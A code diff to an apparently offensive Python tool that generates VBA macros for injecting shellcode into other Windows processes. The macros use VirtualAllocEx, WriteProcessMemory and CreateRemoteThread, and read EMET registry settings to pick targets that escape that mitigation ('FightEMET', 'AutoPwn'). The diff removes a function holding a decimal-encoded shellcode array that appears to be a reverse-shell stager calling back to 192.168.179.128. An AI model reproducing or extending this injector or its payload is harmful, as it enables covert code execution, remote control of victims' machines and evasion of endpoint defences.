@@ -74,15 +74,6 @@ def validate32bitpayload(payload):
 			return True
 		return False
 
-def generateWPM(payload):
-	a = "232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193,,207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,,0,104,119,115,50,95,84,104,76,119,38,7,255,213,184,144,1,0,0,41,,196,84,80,104,41,128,107,0,255,213,106,5,104,192,168,179,128,104,2,0,,1,187,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151,,106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236,,232,97,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213,131,248,,0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229,,255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125,,34,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117,,110,77,97,255,213,94,94,255,12,36,233,113,255,255,255,1,195,41,198,117,,199,195,187,240,181,162,86,106,0,83,255,213"
-	a = a.split(",")
-
-	pos = 0
-	for i in a:
-		print "rekt = WriteProcessMemory(hProcess, ByVal lLinkToLibrary + %s, %s, 1, b)" % (str(pos),str(i))
-		pos += 1
-
 printBanner()
 
 print ""
@@ -417,13 +408,17 @@ lines1 +=  ["Dim vFile As Variant\r\n",
 "oReg.EnumValues HKEY_LOCAL_MACHINE, \"SOFTWARE\\Microsoft\\EMET\\AppSettings\", arrValues, arrTypes\r\n",
 "Dim smack() As String\r\n",
 "Dim count As Integer\r\n",
-"For count = LBound(arrValues) To UBound(arrValues)\r\n",
-"ReDim Preserve smack(count)\r\n",
-"smack(count) = arrValues(count)\r\n",
-"Next\r\n",
+"If Not arrValues = Null Then\r\n",
+"    For count = LBound(arrValues) To UBound(arrValues)\r\n",
+"    ReDim Preserve smack(count)\r\n",
+"    smack(count) = arrValues(count)\r\n",
+"    Next\r\n",
+"Else\r\n",
+"    ReDim Preserve smack(0)\r\n",
+"    smack(0) = \"\"\r\n",
+"End If\r\n",
 "getEMET = smack\r\n",
 "End Function\r\n",
-
 
 # AUTOPWN
 "Public Function AutoPwn() As Long\r\n",
@@ -441,6 +436,7 @@ lines1 +=  ["Dim vFile As Variant\r\n",
 # FIGHT EMET
 "Public Function FightEMET() As String()\r\n",
 "myArray = getList\r\n",
+"Debug.Print myArray(0)\r\n",
 "smex = getEMET\r\n",
 "Dim count As Integer\r\n",
 "Dim sCount As Integer\r\n",
@@ -456,16 +452,18 @@ lines1 +=  ["Dim vFile As Variant\r\n",
 "pathKK = Replace(pathOf(Replace(gg, \"\"\"\", \"\")), \"\\\\\", \"\\\")\r\n",
 "Dim fudgeBool As Boolean\r\n",
 "fudgeBool = False\r\n",
-"For sCount = LBound(smex) To UBound(smex)\r\n",
-"    If LCase(pathKK) Like LCase(smex(sCount)) Then\r\n",
-"        fudgeBool = True\r\n",
+"    If Not smex(0) = \"\" Then\r\n",
+"        For sCount = LBound(smex) To UBound(smex)\r\n",
+"            If LCase(pathKK) Like LCase(smex(sCount)) Then\r\n",
+"                fudgeBool = True\r\n",
+"            End If\r\n",
+"        Next\r\n",
 "    End If\r\n",
-"Next\r\n",
-"If fudgeBool = False Then\r\n",
-"        ReDim Preserve killedEMET(kCount)\r\n",
-"        killedEMET(kCount) = myArray(count)\r\n",
-"        kCount = kCount + 1\r\n",
-"End If\r\n",
+"    If fudgeBool = False Then\r\n",
+"            ReDim Preserve killedEMET(kCount)\r\n",
+"            killedEMET(kCount) = myArray(count)\r\n",
+"            kCount = kCount + 1\r\n",
+"    End If\r\n",
 "Next\r\n",
 "FightEMET = killedEMET\r\n",
 "End Function\r\n",
@@ -491,7 +489,7 @@ lines1 +=  ["Dim vFile As Variant\r\n",
 "If hProcess = 0 Then\r\n",
 "Exit Function\r\n",
 "End If\r\n",
-"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, 1024, &H3000, PAGE_READWRITE)\r\n",
+"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, &H%s, &H3000, PAGE_READWRITE)\r\n" % hex(len(pay64)+30)[2:],
 "If lLinkToLibrary = 0 Then\r\n",
 "Exit Function\r\n",
 "End If      \r\n",
@@ -544,7 +542,7 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 "If hProcess = 0 Then\r\n",
 "Exit Function\r\n",
 "End If\r\n",
-"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, 1024, &H3000, PAGE_READWRITE)\r\n",
+"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, &H%s, &H3000, PAGE_READWRITE)\r\n" % hex(len(pay86)+30)[2:],
 "If lLinkToLibrary = 0 Then\r\n",
 "Exit Function\r\n",
 "End If\r\n",
@@ -592,7 +590,7 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 "If hProcess = 0 Then\r\n",
 "Exit Function\r\n",
 "End If\r\n",
-"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, 1024, &H3000, PAGE_READWRITE)\r\n",
+"lLinkToLibrary = VirtualAllocEx(hProcess, 0&, &H%s, &H3000, PAGE_READWRITE)\r\n" % hex(len(pay86)+30)[2:],
 "If lLinkToLibrary = 0 Then\r\n",
 "Exit Function\r\n",
 "End If         \r\n",
